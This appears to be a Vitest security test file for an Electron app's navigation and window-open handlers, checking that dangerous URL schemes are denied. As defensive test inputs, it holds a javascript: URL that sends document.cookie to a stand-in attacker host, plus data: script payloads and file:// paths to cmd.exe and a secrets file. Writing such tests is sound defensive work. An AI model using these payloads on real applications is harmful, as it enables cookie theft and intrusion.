import { describe, it, expect, vi, beforeEach } from "vitest";
const {
  handleWindowOpen,
  handleWillNavigate,
  setupNavigationGuards,
} = require("../../electron/ipc-handlers");

describe("Security: Electron Navigation & Window Open Guards (Milestone 1.2)", () => {
  const APP_URL = "http://localhost:3000";
  const APP_ORIGIN = "http://localhost:3000";

  let mockShell: { openExternal: ReturnType<typeof vi.fn> };
  let mockEvent: { preventDefault: ReturnType<typeof vi.fn> };

  beforeEach(() => {
    mockShell = {
      openExternal: vi.fn().mockResolvedValue(undefined),
    };
    mockEvent = {
      preventDefault: vi.fn(),
    };
  });

  describe("handleWindowOpen (webContents.setWindowOpenHandler)", () => {
    it("delegates valid external HTTPS URLs to system browser and strictly denies new Electron window", async () => {
      const details = { url: "https://themoviedb.org/movie/123" };
      const result = handleWindowOpen(details, mockShell);

      // Must ALWAYS deny opening child BrowserWindow
      expect(result).toEqual({ action: "deny" });
      expect(mockShell.openExternal).toHaveBeenCalledWith("https://themoviedb.org/movie/123");
    });

    it("delegates valid external HTTP URLs to system browser and denies new Electron window", async () => {
      const details = { url: "http://example.com/external" };
      const result = handleWindowOpen(details, mockShell);

      expect(result).toEqual({ action: "deny" });
      expect(mockShell.openExternal).toHaveBeenCalledWith("http://example.com/external");
    });

    it("strictly denies file:// protocol and does NOT invoke shell.openExternal (Anti-Window-Open Exploitation)", () => {
      const details = { url: "file:///C:/Windows/System32/cmd.exe" };
      const result = handleWindowOpen(details, mockShell);

      // Must be denied and NOT opened in shell
      expect(result).toEqual({ action: "deny" });
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("strictly denies javascript: protocol and does NOT invoke shell.openExternal", () => {
      const details = { url: "javascript:window.open('pwn')" };
      const result = handleWindowOpen(details, mockShell);

      expect(result).toEqual({ action: "deny" });
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("strictly denies data: protocol and does NOT invoke shell.openExternal", () => {
      const details = { url: "data:text/html,<script>alert(1)</script>" };
      const result = handleWindowOpen(details, mockShell);

      expect(result).toEqual({ action: "deny" });
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("strictly denies custom protocols (smb:, ftp:, etc.) and does NOT invoke shell.openExternal", () => {
      expect(handleWindowOpen({ url: "smb://malicious.share/exploit" }, mockShell)).toEqual({ action: "deny" });
      expect(handleWindowOpen({ url: "ftp://attacker.com/files" }, mockShell)).toEqual({ action: "deny" });
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("safely handles null, undefined, and non-string details without throwing", () => {
      expect(handleWindowOpen(null, mockShell)).toEqual({ action: "deny" });
      expect(handleWindowOpen({}, mockShell)).toEqual({ action: "deny" });
      expect(handleWindowOpen({ url: 12345 as any }, mockShell)).toEqual({ action: "deny" });
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });
  });

  describe("handleWillNavigate (webContents 'will-navigate')", () => {
    it("allows legitimate internal application navigation within application origin", () => {
      const internalUrls = [
        "http://localhost:3000/",
        "http://localhost:3000/library",
        "http://localhost:3000/collections/col_123",
        "http://localhost:3000/stats",
        "http://localhost:3000/search?q=Inception",
      ];

      for (const url of internalUrls) {
        mockEvent.preventDefault.mockClear();
        const outcome = handleWillNavigate(mockEvent, url, APP_ORIGIN, mockShell);

        expect(outcome).toEqual({ allowed: true, reason: "internal" });
        expect(mockEvent.preventDefault).not.toHaveBeenCalled();
        expect(mockShell.openExternal).not.toHaveBeenCalled();
      }
    });

    it("blocks in-app external HTTPS navigation, calls preventDefault, and opens in system browser", () => {
      const externalUrl = "https://store.steampowered.com/app/413150/Stardew_Valley/";
      const outcome = handleWillNavigate(mockEvent, externalUrl, APP_ORIGIN, mockShell);

      expect(outcome).toEqual({ allowed: false, reason: "external_opened" });
      expect(mockEvent.preventDefault).toHaveBeenCalledTimes(1);
      expect(mockShell.openExternal).toHaveBeenCalledWith(
        "https://store.steampowered.com/app/413150/Stardew_Valley/"
      );
    });

    it("blocks in-app external HTTP navigation, calls preventDefault, and opens in system browser", () => {
      const externalUrl = "http://tvmaze.com/shows/123";
      const outcome = handleWillNavigate(mockEvent, externalUrl, APP_ORIGIN, mockShell);

      expect(outcome).toEqual({ allowed: false, reason: "external_opened" });
      expect(mockEvent.preventDefault).toHaveBeenCalledTimes(1);
      expect(mockShell.openExternal).toHaveBeenCalledWith("http://tvmaze.com/shows/123");
    });

    it("strictly blocks file:// scheme, cancels navigation, and NEVER opens externally", () => {
      const fileUrl = "file:///C:/Users/Administrator/secret.env";
      const outcome = handleWillNavigate(mockEvent, fileUrl, APP_ORIGIN, mockShell);

      expect(outcome).toEqual({ allowed: false, reason: "blocked_protocol" });
      expect(mockEvent.preventDefault).toHaveBeenCalledTimes(1);
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("strictly blocks javascript: scheme, cancels navigation, and NEVER opens externally", () => {
      const jsUrl = "javascript:document.location='http://attacker.com?leak='+document.cookie";
      const outcome = handleWillNavigate(mockEvent, jsUrl, APP_ORIGIN, mockShell);

      expect(outcome).toEqual({ allowed: false, reason: "blocked_protocol" });
      expect(mockEvent.preventDefault).toHaveBeenCalledTimes(1);
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("strictly blocks data: scheme, cancels navigation, and NEVER opens externally", () => {
      const dataUrl = "data:text/html,<script>alert('pwn')</script>";
      const outcome = handleWillNavigate(mockEvent, dataUrl, APP_ORIGIN, mockShell);

      expect(outcome).toEqual({ allowed: false, reason: "blocked_protocol" });
      expect(mockEvent.preventDefault).toHaveBeenCalledTimes(1);
      expect(mockShell.openExternal).not.toHaveBeenCalled();
    });

    it("strictly blocks custom and unrecognized schemes, cancels navigation", () => {
      const customUrls = [
        "custom-protocol://test",
        "ms-settings://windowsupdate",
        "smb://fileserver/payload",
      ];

      for (const url of customUrls) {
        mockEvent.preventDefault.mockClear();
        const outcome = handleWillNavigate(mockEvent, url, APP_ORIGIN, mockShell);

        expect(outcome).toEqual({ allowed: false, reason: "blocked_protocol" });
        expect(mockEvent.preventDefault).toHaveBeenCalledTimes(1);
        expect(mockShell.openExternal).not.toHaveBeenCalled();
      }
    });

    it("safely rejects malformed URLs and non-string inputs", () => {
      expect(handleWillNavigate(mockEvent, "invalid-url", APP_ORIGIN, mockShell)).toEqual({
        allowed: false,
        reason: "malformed_url",
      });
      expect(mockEvent.preventDefault).toHaveBeenCalled();

      mockEvent.preventDefault.mockClear();
      expect(handleWillNavigate(mockEvent, null as any, APP_ORIGIN, mockShell)).toEqual({
        allowed: false,
        reason: "invalid_type",
      });
      expect(mockEvent.preventDefault).toHaveBeenCalled();
    });
  });

  describe("setupNavigationGuards end-to-end integration", () => {
    it("registers both setWindowOpenHandler and will-navigate listeners on BrowserWindow.webContents", () => {
      let registeredWindowOpenHandler: ((details: any) => any) | null = null;
      const registeredEventHandlers: Record<string, (...args: any[]) => any> = {};

      const mockBrowserWindow = {
        webContents: {
          setWindowOpenHandler(fn: any) {
            registeredWindowOpenHandler = fn;
          },
          on(event: string, fn: any) {
            registeredEventHandlers[event] = fn;
          },
        },
      };

      setupNavigationGuards(mockBrowserWindow as any, APP_URL, mockShell);

      expect(typeof registeredWindowOpenHandler).toBe("function");
      expect(typeof registeredEventHandlers["will-navigate"]).toBe("function");

      // Verify execution of registered setWindowOpenHandler
      const windowOpenResult = registeredWindowOpenHandler!({ url: "https://example.com" });
      expect(windowOpenResult).toEqual({ action: "deny" });
      expect(mockShell.openExternal).toHaveBeenCalledWith("https://example.com/");

      // Verify execution of registered will-navigate listener with internal URL
      registeredEventHandlers["will-navigate"](mockEvent, "http://localhost:3000/library");
      expect(mockEvent.preventDefault).not.toHaveBeenCalled();

      // Verify execution of registered will-navigate listener with dangerous scheme
      registeredEventHandlers["will-navigate"](mockEvent, "file:///C:/test.txt");
      expect(mockEvent.preventDefault).toHaveBeenCalled();
    });
  });
});
